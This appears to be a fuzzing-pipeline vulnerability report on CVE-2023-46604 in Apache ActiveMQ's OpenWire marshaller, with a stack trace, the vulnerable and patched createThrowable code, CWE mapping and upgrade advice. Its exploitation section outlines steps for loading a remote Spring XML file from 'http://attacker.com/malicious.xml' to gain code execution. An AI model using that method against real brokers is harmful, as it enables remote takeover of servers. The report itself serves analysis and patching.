# Vulnerability Analysis for cpv_3

## Summary
- **CPV ID**: cpv_3
- **Harness**: ActivemqOne
- **Vulnerability Type**: Remote Code Execution via Unsafe Deserialization
- **Origin**: 1-day
- **Release Date**: 10/27/2023
- **References**: 
  - https://nvd.nist.gov/vuln/detail/CVE-2023-46604
  - https://github.com/advisories/GHSA-crg9-44h2-xw35
  - https://osv.dev/vulnerability/CVE-2023-46604

## Crash Log Analysis
- **Error Type**: FuzzerSecurityIssueHigh: Remote Code Execution
- **Crash Location**: org.apache.activemq.openwire.v4.BaseDataStreamMarshaller.createThrowable (line 233)
- **Vulnerable Function**: createThrowable
- **DEDUP Token**: 57eac4f871d0bc83

### Stack Trace
```
== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueHigh: Remote Code Execution
Unrestricted class/object creation based on externally controlled data may allow
remote code execution depending on available classes on the classpath.
	at jaz.Zer.reportFinding(Zer.java:110)
	at jaz.Zer.reportFindingIfEnabled(Zer.java:105)
	at jaz.Zer.<init>(Zer.java:82)
	at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:77)
	at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:480)
	at org.apache.activemq.openwire.v4.BaseDataStreamMarshaller.createThrowable(BaseDataStreamMarshaller.java:233)
	at org.apache.activemq.openwire.v4.BaseDataStreamMarshaller.looseUnmarsalThrowable(BaseDataStreamMarshaller.java:517)
	at org.apache.activemq.openwire.v4.ExceptionResponseMarshaller.looseUnmarshal(ExceptionResponseMarshaller.java:113)
	at org.apache.activemq.openwire.OpenWireFormat.doUnmarshal(OpenWireFormat.java:379)
	at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:290)
```

## Vulnerable Code Location(s)

### Location 1 (crash_site)
- **Type**: crash_site
- **File Path**: activemq-openwire-legacy/src/main/java/org/apache/activemq/openwire/v4/BaseDataStreamMarshaller.java
- **Function**: createThrowable
- **Line Range**: 229-239
- **Column Range**: 1-5 (method start)

### Location 2 (root_cause) - Same as crash_site
The root cause is in the same location as the crash site. The `createThrowable` method lacks validation to ensure that the class being instantiated is actually a subclass of `Throwable`.

### Code Context
```java
private Throwable createThrowable(String className, String message) {
    try {
        Class clazz = Class.forName(className, false, BaseDataStreamMarshaller.class.getClassLoader());
        // MISSING VALIDATION: No check that clazz is assignable to Throwable
        Constructor constructor = clazz.getConstructor(new Class[] {String.class});
        return (Throwable)constructor.newInstance(new Object[] {message});
    } catch (IllegalArgumentException e) {
        return e;
    } catch (Throwable e) {
        return new Throwable(className + ": " + message);
    }
}
```

The method is called from:
- `looseUnmarsalThrowable` (line 517)
- `tightUnmarsalThrowable` (similar location)

These unmarshalling methods are invoked when processing `ExceptionResponse` objects from the OpenWire protocol.

## CWE Classification
- **CWE-502**: Deserialization of Untrusted Data
- **CWE-470**: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')
- **CWE-94**: Improper Control of Generation of Code ('Code Injection')

## Vulnerability Description

**CVE-2023-46604** is a critical remote code execution vulnerability in Apache ActiveMQ's OpenWire protocol marshaller. The vulnerability exists in the `createThrowable` method of `BaseDataStreamMarshaller`, which allows arbitrary class instantiation without proper validation.

### Attack Vector
An attacker with network access to the OpenWire protocol port (typically 61616) can send a malicious `ExceptionResponse` message containing:
1. An arbitrary class name (not necessarily a Throwable subclass)
2. A string parameter to pass to the class constructor

The `createThrowable` method will:
1. Load the specified class using `Class.forName()`
2. Obtain a constructor that accepts a String parameter
3. Instantiate the class with the attacker-controlled string
4. Attempt to cast it to Throwable (this cast succeeds or throws an exception, but the class is already instantiated)

### Exploitation
The most common exploitation method uses `org.springframework.context.support.ClassPathXmlApplicationContext`, which is available on ActiveMQ's classpath. This class has a constructor that accepts a String representing a URL to an XML configuration file. An attacker can:
1. Host a malicious Spring XML configuration file on a remote server
2. Send an ExceptionResponse with className=`ClassPathXmlApplicationContext` and message=`http://attacker.com/malicious.xml`
3. The application will load and execute the malicious XML configuration, achieving remote code execution

### Root Cause
The vulnerability exists because `createThrowable` performs no validation that the loaded class is actually a subclass of `Throwable` before instantiating it. This allows instantiation of arbitrary classes with a String constructor parameter.

## Patch Analysis

The fix adds validation before instantiation:

**New validation method in OpenWireUtil.java:**
```java
public static void validateIsThrowable(Class<?> clazz) {
    if (!Throwable.class.isAssignableFrom(clazz)) {
        throw new IllegalArgumentException("Class " + clazz + " is not assignable to Throwable");
    }
}
```

**Applied in BaseDataStreamMarshaller.createThrowable:**
```java
private Throwable createThrowable(String className, String message) {
    try {
        Class clazz = Class.forName(className, false, BaseDataStreamMarshaller.class.getClassLoader());
        OpenWireUtil.validateIsThrowable(clazz);  // NEW: Validation added
        Constructor constructor = clazz.getConstructor(new Class[] {String.class});
        return (Throwable)constructor.newInstance(new Object[] {message});
    ...
}
```

This ensures that only legitimate Throwable subclasses can be instantiated, preventing the exploitation of arbitrary class constructors for remote code execution.

## POV Analysis

The POV file (`pov_0.blob`, 39 bytes) contains a crafted OpenWire protocol message that triggers the vulnerability. The message is designed to:
1. Trigger unmarshalling of an ExceptionResponse object
2. Contain a malicious class name (likely `jaz.Zer` based on the stack trace)
3. Pass a string parameter that causes the instantiation

The Jazzer fuzzer detected this as a security issue through its `Deserialization` hooks, which monitor for unsafe class instantiation patterns.

## Recommendations
- **Suggested CWEs**: [CWE-502, CWE-470, CWE-94]
- **Vulnerability Name**: "Apache ActiveMQ OpenWire Deserialization Remote Code Execution (CVE-2023-46604)"
- **Severity**: Critical (CVSS 10.0)
- **Remediation**: Upgrade to Apache ActiveMQ versions 5.15.16, 5.16.7, 5.17.6, or 5.18.3